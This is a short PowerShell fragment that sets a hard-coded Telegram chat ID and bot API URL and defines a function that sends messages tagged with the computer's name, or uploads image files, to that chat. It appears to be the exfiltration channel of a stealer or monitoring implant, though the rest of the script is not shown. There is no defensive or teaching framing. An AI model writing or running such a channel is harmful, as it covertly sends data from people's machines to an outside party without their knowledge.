$chatId = "6494641721"
$apiUrl = "https://api.telegram.org/bot$botToken"

function Send-TG ($text, $isPath=$false) {
    try {
        if($isPath){ curl.exe -s -F "chat_id=$chatId" -F "photo=@$text" "$apiUrl/sendPhoto" }
        else {
            $body = @{chat_id=$chatId; text="[$env:COMPUTERNAME] $text"; parse_mode="Markdown"}
            Invoke-RestMethod -Uri "$apiUrl/sendMessage" -Method Post -Body $body -ErrorAction Stop
        }
    } catch { Write-Host "TG Error" }
}

